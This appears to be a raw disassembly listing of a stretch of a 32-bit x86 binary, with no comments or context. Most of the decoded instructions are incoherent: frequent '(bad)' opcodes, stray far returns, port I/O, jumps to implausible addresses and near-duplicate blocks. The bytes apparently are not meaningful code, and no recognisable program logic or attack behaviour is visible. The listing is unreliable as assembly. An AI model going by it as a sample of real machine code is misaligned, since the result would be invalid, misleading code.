  430550:	add    eax,DWORD PTR [ebp-0x77]
  430553:	mov    eax,esp
  430555:	fmul   QWORD PTR [ebp-0x3d]
  430558:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43055f:	mov    DWORD PTR [ebp-0x24],eax
  430562:	rol    DWORD PTR [ebp-0x64],1
  430565:	xor    eax,edi
  430567:	mov    ecx,0xff858db0
  43056c:	clc    
  43056d:	enter  0x4d45,0x3c
  430571:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430578:	test   esi,edi
  43057a:	clc    
  43057b:	inc    DWORD PTR [ebp+0x45]
  43057e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430586:	test   DWORD PTR [ecx],esi
  430588:	clc    
  430589:	pushf  
  43058a:	inc    ebp
  43058b:	(bad)  
  43058c:	cmp    ah,bh
  43058e:	pushf  
  43058f:	inc    ebp
  430590:	mov    edx,DWORD PTR [eax-0x24]
  430593:	add    BYTE PTR [ebp+0x0],dl
  430596:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43059c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4305a0:	add    al,dl
  4305a2:	jmp    0x1040772
  4305a7:	jb     0x4305f6
  4305a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4305af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4305b2:	xor    ecx,DWORD PTR [edi]
  4305b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4305b8:	(bad)  
  4305ba:	clc    
  4305bb:	int3   
  4305bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4305c3:	push   cs
  4305c4:	xor    ecx,eax
  4305c6:	xor    esp,ecx
  4305c8:	add    ebp,DWORD PTR [eax]
  4305ca:	add    esi,DWORD PTR [eax]
  4305cc:	(bad)  
  4305ce:	retf   0x55cc
  4305d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4305d5:	(bad)  
  4305d6:	cli    
  4305d7:	fdiv   st(1),st
  4305d9:	test   DWORD PTR [eax+edi*8],ecx
  4305dc:	dec    ebp
  4305dd:	inc    ebp
  4305de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4305e4:	add    BYTE PTR [ebp+0x0],al
  4305e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4305ea:	mov    ecx,ebx
  4305ec:	clc    
  4305ed:	jne    0x4305ba
  4305ef:	mov    esi,0xd672d3
  4305f4:	into   
  4305f5:	into   
  4305f6:	scas   eax,DWORD PTR es:[edi]
  4305f7:	dec    ebp
  4305f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4305fe:	sub    ecx,esi
  430600:	cmp    ecx,DWORD PTR [ebp+0x77]
  430603:	(bad)  
  430604:	mov    edi,eax
  430606:	mov    al,0x85
  430608:	mov    eax,edi
  43060a:	add    BYTE PTR [ebp-0x75],al
  43060d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430614:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43061a:	(bad)  
  43061c:	retf   0x559c
  43061f:	(bad)  
  430620:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430627:	inc    ebp
  430628:	add    eax,0xeb9c4d3f
  43062d:	(bad)  
  43062e:	mov    ecx,eax
  430630:	lods   al,BYTE PTR ds:[esi]
  430631:	test   DWORD PTR [ebp-0x8],edx
  430634:	xor    ecx,DWORD PTR [ebp+0x33]
  430637:	mov    eax,DWORD PTR [ebx]
  430639:	lock add ecx,ebx
  43063c:	bswap  esi
  43063e:	retf   0x55d1
  430641:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430647:	jmp    0x430642
  430649:	add    BYTE PTR ds:0xebc44d8b,al
  43064f:	push   ebp
  430650:	mov    ebp,DWORD PTR [ebx]
  430652:	test   al,0x8b
  430654:	push   ebp
  430655:	clc    
  430656:	xor    ecx,ebx
  430658:	xor    ecx,esi
  43065a:	add    edx,ecx
  43065c:	add    eax,DWORD PTR [edx+0xca010f]
  430662:	push   ebp
  430663:	dec    ebp
  430664:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43066a:	stc    
  43066b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430671:	scas   eax,DWORD PTR es:[edi]
  430672:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430678:	xor    ebp,DWORD PTR [ebx]
  43067a:	xor    edi,DWORD PTR [ebx]
  43067c:	add    esi,DWORD PTR [edi+0x3]
  43067f:	mov    ecx,DWORD PTR [edi]
  430681:	clc    
  430682:	retf   0x55cb
  430685:	into   
  430686:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43068d:	mov    eax,0x3376554d
  430692:	mov    esi,DWORD PTR [ebx]
  430694:	enter  0x5503,0x3
  430698:	xor    ecx,DWORD PTR [edi]
  43069a:	xor    ecx,edx
  43069c:	add    edx,DWORD PTR [ebp+0x3]
  43069f:	mov    ecx,DWORD PTR [edi]
  4306a1:	lock retf 0x4dfa
  4306a5:	stc    
  4306a6:	mov    ecx,DWORD PTR [eax]
  4306a8:	or     BYTE PTR [ebp+0x4d],cl
  4306ab:	jmp    0x107073b
  4306b0:	dec    ebp
  4306b1:	dec    ebp
  4306b2:	(bad)  
  4306b3:	mov    esp,esp
  4306b5:	clc    
  4306b6:	test   ebx,ecx
  4306b8:	clc    
  4306b9:	ror    DWORD PTR [ebp-0x2a],cl
  4306bc:	mov    esi,ecx
  4306be:	in     al,dx
  4306bf:	scas   eax,DWORD PTR es:[edi]
  4306c0:	inc    ebp
  4306c1:	mov    esi,DWORD PTR [ebx]
  4306c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4306ca:	retf   
  4306cb:	ja     0x43069b
  4306cd:	mov    ebp,DWORD PTR [eax-0x48]
  4306d0:	dec    ebp
  4306d1:	xor    ecx,DWORD PTR [di+0x3]
  4306d5:	mov    ebp,eax
  4306d7:	clc    
  4306d8:	push   ebp
  4306d9:	retf   
  4306da:	mov    dl,bl
  4306dc:	adc    esi,edx
  4306de:	jb     0x4306ae
  4306e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4306e6:	in     al,dx
  4306e7:	jge    0x4306b4
  4306e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4306ec:	mov    esi,DWORD PTR [edi-0x24]
  4306ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4306f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4306fc:	mov    edx,ebx
  4306fe:	in     al,dx
  4306ff:	(bad)  
  430700:	ror    esi,cl
  430702:	push   ebp
  430703:	scas   eax,DWORD PTR es:[edi]
  430704:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43070a:	fwait
  43070b:	sub    esi,DWORD PTR [edx]
  43070d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430713:	lods   al,BYTE PTR ds:[esi]
  430714:	xor    esp,DWORD PTR [ebx]
  430716:	add    ecx,DWORD PTR [ebp-0x18]
  430719:	mov    edi,DWORD PTR [ebp-0x8]
  43071c:	mov    bl,cl
  43071e:	cmp    dl,bl
  430720:	jb     0x4306f0
  430722:	add    dh,dl
  430724:	dec    ebp
  430725:	scas   eax,DWORD PTR es:[edi]
  430726:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43072c:	shr    DWORD PTR [ebx],cl
  43072e:	into   
  43072f:	cmp    edx,esi
  430731:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430737:	dec    ebp
  430738:	dec    ebp
  430739:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43073f:	retf   
  430740:	xor    edx,esi
  430742:	add    ecx,esi
  430744:	imul   ecx,edx
  430747:	mov    DWORD PTR [ebp+0x8],edx
  43074a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43074d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430753:	add    esi,DWORD PTR [ebx]
  430755:	mov    ah,0x3
  430757:	inc    ebp
  430758:	rdtsc  
  43075a:	xlat   BYTE PTR ds:[ebx]
  43075b:	pushf  
  43075c:	jge    0x4306e7
  43075e:	xor    ebx,esp
  430760:	sub    eax,DWORD PTR [ebp-0x73]
  430763:	(bad)  
  430764:	cmp    al,al
  430766:	jb     0x4306ed
  430768:	add    al,bh
  43076a:	ror    DWORD PTR [ebp-0x7a],1
  43076d:	xor    edi,edi
  43076f:	add    edi,edi
  430771:	jmp    0x4307c0
  430773:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430779:	dec    ebp
  43077a:	into   
  43077b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430781:	fwait
  430782:	shl    DWORD PTR [edx],cl
  430784:	retf   0x5588
  430787:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43078d:	add    eax,DWORD PTR [eax]
  43078f:	call   0x8ace5ce1
  430794:	fcom   DWORD PTR [ecx]
  430796:	retf   
  430797:	jb     0x4307fe
  430799:	add    ch,cl
  43079b:	dec    ebp
  43079c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4307a2:	dec    ebp
  4307a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4307a9:	jge    0x430779
  4307ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4307b1:	add    cl,dh
  4307b3:	dec    ebp
  4307b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4307ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4307be:	add    ah,bl
  4307c0:	jge    0x43074e
  4307c2:	push   0xffffff9b
  4307c4:	push   0x8b3032
  4307c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4307cd:	xor    edi,edi
  4307cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4307d2:	inc    ebp
  4307d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4307d9:	dec    ebp
  4307da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4307e0:	jbe    0x43076d
  4307e2:	mov    esp,eax
  4307e4:	ror    bl,1
  4307e6:	enter  0x14ce,0xaf
  4307ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4307f0:	push   ebp
  4307f1:	retf   0x5540
  4307f4:	push   ebp
  4307f5:	mov    esi,DWORD PTR [edx-0x18]
  4307f8:	mov    edx,ebx
  4307fa:	cld    
  4307fb:	(bad)  
  4307fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430803:	sti    
  430804:	add    dh,cl
  430806:	push   0xffffff94
  430808:	call   FWORD PTR [ebx+0x3b5032d0]
  43080e:	mov    ecx,DWORD PTR [edi]
  430810:	enter  0x455e,0xff
  430814:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43081a:	xor    esi,DWORD PTR [ebx]
  43081c:	mov    DWORD PTR [ebx],0xcace0f9c
  430822:	aas    
  430823:	push   ebp
  430824:	inc    ebp
  430825:	xor    edx,esi
  430827:	add    edx,esi
  430829:	mov    eax,DWORD PTR [ebx]
  43082b:	(bad)  
  43082c:	jmp    0x4307ba
  43082e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430834:	rol    ah,1
  430836:	mov    esi,0xf133104d
  43083b:	mov    edx,0xff388d80
  430840:	mov    dh,0xd1
  430842:	cmp    edx,DWORD PTR [ebp+0xf]
  430845:	mov    eax,DWORD PTR [edx-0x28]
  430848:	add    BYTE PTR [ebp-0x75],bh
  43084b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430852:	fwait
  430853:	retf   0x8632
  430856:	cmp    ebp,0x8
  430859:	call   ebx
  43085b:	inc    ebp
  43085c:	inc    ebp
  43085d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430863:	mov    esi,DWORD PTR [ecx]
  430865:	int3   
  430866:	pushf  
  430867:	add    al,0xc7
  430869:	add    al,al
  43086b:	add    bl,al
  43086d:	(bad)  
  43086e:	clc    
  43086f:	int3   
  430870:	inc    ebp
  430871:	add    BYTE PTR [ecx],dh
  430873:	push   eax
  430874:	pushf  
  430875:	mov    edi,eax
  430877:	enter  0xc008,0x85
  43087b:	aas    
  43087c:	clc    
  43087d:	gs inc ebp
  43087f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430885:	push   ss
  430886:	xor    ecx,DWORD PTR [ebp+0x3]
  430889:	sub    edx,DWORD PTR [ecx-0x76]
  43088c:	dec    ebp
  43088d:	add    DWORD PTR [ebx+0x88d845],ecx
  430893:	mov    esi,DWORD PTR [ebx]
  430895:	or     BYTE PTR [ebx],al
  430897:	cmp    edx,DWORD PTR [ecx-0x34]
  43089a:	dec    ebp
  43089b:	out    dx,eax
  43089c:	xor    eax,DWORD PTR [ebp+0x3]
  43089f:	mov    edx,DWORD PTR [ecx-0x28]
  4308a2:	dec    ebp
  4308a3:	add    BYTE PTR [ebx],dh
  4308a5:	push   0x518003
  4308aa:	push   eax
  4308ab:	add    BYTE PTR [ebx-0x300748b],cl
  4308b1:	sbb    BYTE PTR [ebp+0x45],cl
  4308b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4308ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4308c0:	dec    ebp
  4308c1:	inc    ebp
  4308c2:	xor    edx,esi
  4308c4:	add    edx,esi
  4308c6:	push   ecx
  4308c7:	(bad)  
  4308c8:	dec    ebp
  4308c9:	mov    al,ds:0xc5d83dff
  4308ce:	retf   
  4308cf:	(bad)  
  4308d0:	into   
  4308d1:	sub    bh,bh
  4308d3:	dec    esp
  4308d4:	adc    al,0x9c
  4308d6:	inc    ebp
  4308d7:	push   ebp
  4308d8:	test   DWORD PTR [edi],ecx
  4308da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4308e1:	jmp    0xc9bc17f5
  4308e6:	add    cl,dl
  4308e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4308f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4308f8:	rol    BYTE PTR [eax],0x54
  4308fb:	clc    
  4308fc:	gs jb  0x430906
  4308ff:	mov    eax,DWORD PTR [ebp-0x30]
  430902:	xor    al,0x40
  430904:	sub    al,0xc7
  430906:	mov    al,ah
  430908:	add    DWORD PTR [ebp+0x4534f845],eax
  43090e:	sub    al,0x80
  430910:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430917:	mov    ch,0xff
  430919:	clc    
  43091a:	add    DWORD PTR [ebp+0x60],0x3d
  43091e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430925:	inc    ebp
  430926:	dec    DWORD PTR [ebx-0x3427f701]
  43092c:	test   esi,ecx
  43092e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430934:	push   eax
  430935:	add    DWORD PTR [ebp+0x0],eax
  430938:	dec    ebx
  43093a:	or     al,0xce
  43093c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430943:	into   
  430944:	add    BYTE PTR [ebx-0x34ff2000],cl
  43094a:	mov    esi,ecx
  43094c:	sar    bh,0x45
  43094f:	adc    al,0x8b
  430951:	clc    
  430952:	fadd   DWORD PTR [ebp+0x0]
  430955:	mov    ebp,DWORD PTR [edx+0x8]
  430958:	push   edi
  430959:	adc    BYTE PTR [eax+0x1],0x83
  43095d:	add    al,al
  43095f:	retf   
  430960:	mov    ecx,esi
  430962:	cld    
  430963:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430969:	into   
  43096a:	add    BYTE PTR [ebx+0x756ae000],cl
  430970:	jne    0x4309a5
  430972:	inc    DWORD PTR [ebx]
  430974:	rcl    BYTE PTR [ecx+0x50],1
  430977:	push   eax
  430978:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43097e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430985:	sar    bh,0x84
  430988:	or     BYTE PTR [ebx],al
  43098a:	push   eax
  43098b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430991:	pushf  
  430992:	xor    edi,eax
  430994:	pushf  
  430995:	mov    ah,0x89
  430997:	test   esp,ebp
  430999:	clc    
  43099a:	inc    ebp
  43099b:	inc    ebp
  43099c:	mov    DWORD PTR [eax+eax*8],esi
  43099f:	sub    al,0x32
  4309a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4309a8:	dec    ebp
  4309a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4309b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4309be:	shl    DWORD PTR [ebp-0x380064],1
  4309c4:	enter  0x858d,0x60
  4309c8:	clc    
  4309c9:	inc    DWORD PTR [ebp+0x50]
  4309cc:	cmp    al,0x75
  4309ce:	pushf  
  4309cf:	(bad)  
  4309d0:	(bad)  
  4309d1:	pop    esp
  4309d2:	lods   al,BYTE PTR ds:[esi]
  4309d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4309d9:	mov    edi,DWORD PTR [esi]
  4309db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4309e2:	test   DWORD PTR [edi-0x8],edx
  4309e5:	sbb    al,0x45
  4309e7:	add    BYTE PTR [eax],bh
  4309e9:	push   0x8b809c
  4309ee:	loopne 0x430a35
  4309f0:	push   ebp
  4309f1:	mov    esi,DWORD PTR [ebx]
  4309f3:	cld    
  4309f4:	add    eax,DWORD PTR [eax+0xf013b]
  4309fa:	adc    al,0x0
  4309fc:	add    bh,bh
  4309fe:	jmp    0xc00b1b
  430a03:	add    BYTE PTR [ebp+0x45],cl
  430a06:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a0c:	dec    ebp
  430a0d:	push   0x38033
  430a12:	cmp    eax,DWORD PTR [eax]
  430a14:	unpcklps xmm7,xmm0
  430a17:	jne    0x430a19
  430a19:	dec    DWORD PTR [ebx+0x5545c818]
  430a1f:	mov    DWORD PTR [ebx],esi
  430a21:	shl    BYTE PTR [ebx],1
  430a23:	inc    ebp
  430a24:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430a2a:	retf   0x5575
  430a2d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430a33:	(bad)  
  430a34:	stc    
  430a35:	loopne 0x430a43
  430a37:	test   DWORD PTR [ebp-0x8],ecx
  430a3a:	xor    eax,DWORD PTR [ebp+0x3]
  430a3d:	mov    ebp,ecx
  430a3f:	rol    BYTE PTR [eax],1
  430a41:	inc    ebp
  430a42:	add    BYTE PTR [eax-0x7747ab3],bh
  430a48:	clc    
  430a49:	inc    ebp
  430a4a:	retf   
  430a4b:	mov    edx,ebx
  430a4d:	loopne 0x430a25
  430a4f:	retf   
  430a50:	into   
  430a51:	into   
  430a52:	scas   eax,DWORD PTR es:[edi]
  430a53:	dec    ebp
  430a54:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430a5a:	sub    ecx,esi
  430a5c:	cmp    ecx,DWORD PTR [ebp+0x77]
  430a5f:	(bad)  
  430a60:	mov    edi,eax
  430a62:	enter  0x8985,0xf8
  430a66:	add    BYTE PTR [ebp-0x75],al
  430a69:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430a70:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430a76:	(bad)  
  430a78:	retf   0x559c
  430a7b:	(bad)  
  430a7c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a83:	inc    ebp
  430a84:	add    eax,0xeb9c4d3f
  430a89:	(bad)  
  430a8a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a90:	xor    ecx,DWORD PTR [ebp+0x33]
  430a93:	mov    eax,DWORD PTR [ebx]
  430a95:	in     al,dx
  430a96:	add    ecx,ebx
  430a98:	bswap  esi
  430a9a:	retf   0x55d1
  430a9d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430aa3:	jmp    0x430a9e
  430aa5:	add    BYTE PTR ds:0xebf44d8b,al
  430aab:	push   ebp
  430aac:	mov    ebp,DWORD PTR [ebx]
  430aae:	mov    eax,0x33f8558b
  430ab3:	retf   
  430ab4:	xor    ecx,esi
  430ab6:	add    edx,ecx
  430ab8:	add    eax,DWORD PTR [edx+0xca010f]
  430abe:	push   ebp
  430abf:	dec    ebp
  430ac0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430ac6:	stc    
  430ac7:	rol    DWORD PTR ds:0xebce4dd6,cl
  430acd:	scas   eax,DWORD PTR es:[edi]
  430ace:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430ad4:	xor    ebp,DWORD PTR [ebx]
  430ad6:	xor    edi,DWORD PTR [ebx]
  430ad8:	add    esi,DWORD PTR [edi+0x3]
  430adb:	mov    ecx,DWORD PTR [edi]
  430add:	clc    
  430ade:	retf   0x55cb
  430ae1:	into   
  430ae2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430ae9:	test   al,0x4d
  430aeb:	push   ebp
  430aec:	jbe    0x430b21
  430aee:	mov    esi,DWORD PTR [ebx]
  430af0:	mov    al,0x3
  430af2:	push   ebp
  430af3:	add    esi,DWORD PTR [ebx]
  430af5:	rdpmc  
  430af7:	retf   0x5503
  430afa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b00:	dec    ebp
  430b01:	stc    
  430b02:	mov    ecx,DWORD PTR [eax]
  430b04:	or     BYTE PTR [ebp+0x4d],cl
  430b07:	jmp    0x1370b97
  430b0c:	dec    ebp
  430b0d:	dec    ebp
  430b0e:	(bad)  
  430b0f:	mov    esp,esp
  430b11:	clc    
  430b12:	test   ebx,ecx
  430b14:	clc    
  430b15:	ror    DWORD PTR [ebp-0x2a],cl
  430b18:	mov    esi,ecx
  430b1a:	lock scas eax,DWORD PTR es:[edi]
  430b1c:	inc    ebp
  430b1d:	mov    esi,DWORD PTR [ebx]
  430b1f:	hlt    
  430b20:	pushf  
  430b21:	jge    0x430aae
  430b23:	sub    esp,esp
  430b25:	cmp    ecx,ebx
  430b27:	ja     0x430af7
  430b29:	mov    ebp,DWORD PTR [eax-0x58]
  430b2c:	dec    ebp
  430b2d:	xor    ecx,DWORD PTR [di+0x3]
  430b31:	mov    ebp,eax
  430b33:	clc    
  430b34:	push   ebp
  430b35:	retf   
  430b36:	mov    dl,bl
  430b38:	adc    esi,edx
  430b3a:	jb     0x430b0a
  430b3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430b42:	lock jge 0x430b10
  430b45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430b48:	mov    esi,DWORD PTR [edi-0x28]
  430b4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430b52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430b58:	mov    edx,ebx
  430b5a:	lock (bad) 
  430b5c:	ror    esi,cl
  430b5e:	push   ebp
  430b5f:	scas   eax,DWORD PTR es:[edi]
  430b60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430b66:	fwait
  430b67:	sub    esi,DWORD PTR [edx]
  430b69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b70:	xor    esp,DWORD PTR [ebx]
  430b72:	add    ecx,DWORD PTR [ebp-0x18]
  430b75:	mov    edi,DWORD PTR [ebp-0x8]
  430b78:	mov    bl,cl
  430b7a:	cmp    dl,bl
  430b7c:	jb     0x430b4c
  430b7e:	add    dh,dl
  430b80:	dec    ebp
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b88:	shr    DWORD PTR [ebx],cl
  430b8a:	into   
  430b8b:	cmp    edx,esi
  430b8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b93:	dec    ebp
  430b94:	dec    ebp
  430b95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b9b:	retf   
  430b9c:	xor    edx,esi
  430b9e:	add    ecx,esi
  430ba0:	imul   ecx,edx
  430ba3:	mov    DWORD PTR [ebp+0x8],edx
  430ba6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430ba9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430baf:	add    esi,DWORD PTR [ebx]
  430bb1:	rol    BYTE PTR [ebx],0x45
  430bb4:	rdtsc  
  430bb6:	xlat   BYTE PTR ds:[ebx]
  430bb7:	pushf  
  430bb8:	jge    0x430b43
  430bba:	xor    ebx,eax
  430bbc:	sub    eax,DWORD PTR [ebp-0x73]
  430bbf:	(bad)  
  430bc0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430bc7:	dec    ebp
  430bc8:	xchg   BYTE PTR [ebx],dh
  430bca:	inc    DWORD PTR [ebx]
  430bcc:	(bad)  
  430bcd:	jmp    0x430c1c
  430bcf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430bd5:	dec    ebp
  430bd6:	into   
  430bd7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430bdd:	fwait
  430bde:	shl    DWORD PTR [edx],cl
  430be0:	retf   0x5588
  430be3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430be9:	add    eax,DWORD PTR [eax]
  430beb:	call   0x8ace613d
  430bf0:	fcom   QWORD PTR [ecx]
  430bf2:	retf   
  430bf3:	jb     0x430c5a
  430bf5:	add    ch,cl
  430bf7:	dec    ebp
  430bf8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430bfe:	dec    ebp
  430bff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c05:	jge    0x430bd5
  430c07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c0d:	add    cl,dh
  430c0f:	dec    ebp
  430c10:	dec    DWORD PTR [ebx-0x2c031b01]
  430c16:	inc    ebp
  430c17:	push   ebp
  430c18:	dec    DWORD PTR [ebx-0x73ff2734]
  430c1e:	lea    ebx,[ebx-0x7400cdac]
  430c24:	push   eax
  430c25:	mov    ah,0x45
  430c27:	push   ebp
  430c28:	mov    esi,DWORD PTR [ebx]
  430c2a:	les    esi,FWORD PTR [ebx]
  430c2c:	add    BYTE PTR [ebx],al
  430c2e:	inc    DWORD PTR [ebx]
  430c30:	mov    ecx,DWORD PTR [edi]
  430c32:	cld    
  430c33:	retf   0x4d80
  430c36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430c3c:	jne    0x430bc9
  430c3e:	jmp    eax
  430c40:	ror    bl,1
  430c42:	or     cl,dh
  430c44:	add    BYTE PTR [edi-0xf2f7475],ch
  430c4a:	not    bl
  430c4c:	adc    al,0xca
  430c4e:	inc    ebp
  430c4f:	push   ebp
  430c50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430c56:	push   0xaf80d6
  430c5b:	mov    eax,DWORD PTR [eax]
  430c5d:	in     al,0xff
  430c5f:	sti    
  430c60:	sbb    dh,cl
  430c62:	pop    esi
  430c63:	xchg   esp,eax
  430c64:	leave  
  430c65:	fwait
  430c66:	add    al,0x32
  430c68:	push   ebp
  430c69:	cmp    ebp,esp
  430c6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430c6f:	dec    DWORD PTR [ecx-0x740f0375]
  430c75:	push   ebp
  430c76:	cld    
  430c77:	xor    ebp,ebx
  430c79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430c7f:	push   ebp
  430c80:	clc    
  430c81:	xor    esi,ecx
  430c83:	add    esi,DWORD PTR [ebp-0x75]
  430c86:	(bad)  
  430c87:	hlt    
  430c88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c8f:	mov    DWORD PTR [esi],eax
  430c91:	hlt    
  430c92:	(bad)  
  430c93:	dec    ebp
  430c94:	add    esi,DWORD PTR [ebx]
  430c96:	(bad)  
  430c97:	mov    edx,0xffc68d0a
  430c9c:	add    dl,cl
  430c9e:	leave  
  430c9f:	push   ebp
  430ca0:	push   ebp
  430ca1:	mov    ebp,esp
  430ca3:	fcom   QWORD PTR [ecx+0x7d]
  430ca6:	inc    ebp
  430ca7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430cad:	iret   
  430cae:	cld    
  430caf:	retf   0x868f
  430cb2:	loopne 0x430cb1
  430cb4:	mov    edi,edi
  430cb6:	mov    esi,DWORD PTR [ebp-0x8]
  430cb9:	mov    esi,eax
  430cbb:	cld    
  430cbc:	jne    0x430c6e
  430cbe:	mov    BYTE PTR [ecx],0xa
  430cc1:	add    dh,al
  430cc3:	test   DWORD PTR [eax],ecx
  430cc5:	inc    esi
  430cc7:	inc    DWORD PTR [edi]
  430cc9:	mov    eax,esi
  430ccb:	cld    
  430ccc:	add    DWORD PTR [eax+0x901c6],eax
  430cd2:	leave  
  430cd3:	xor    BYTE PTR [ebp+0x45],dl
  430cd6:	in     al,dx
  430cd7:	mov    edx,DWORD PTR [ecx-0x40]
  430cda:	inc    ebp
  430cdb:	add    BYTE PTR [ecx-0x74000301],cl
  430ce1:	int3   
  430ce2:	cld    
  430ce3:	jne    0x430c9d
  430ce5:	call   0xcc1ff0
  430cea:	mov    esi,DWORD PTR [ebp-0x8]
  430ced:	test   eax,esi
  430cef:	je     0x430d66
  430cf1:	mov    eax,esi
  430cf3:	cld    
  430cf4:	add    al,0x80
  430cf6:	add    WORD PTR [ecx+0x0],ax
  430cfa:	fiadd  DWORD PTR [eax]
  430cfc:	mov    BYTE PTR [eax],0x3d
  430cff:	push   0xffffffc3
  430d01:	push   esi
  430d02:	mov    edx,DWORD PTR [eax+0x51]
  430d05:	pop    edi
  430d06:	lea    ebx,[ebx-0x8]
  430d09:	ret    0x45
  430d0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d12:	xchg   eax,edi
  430d14:	mov    DWORD PTR [ebp-0x75],ecx
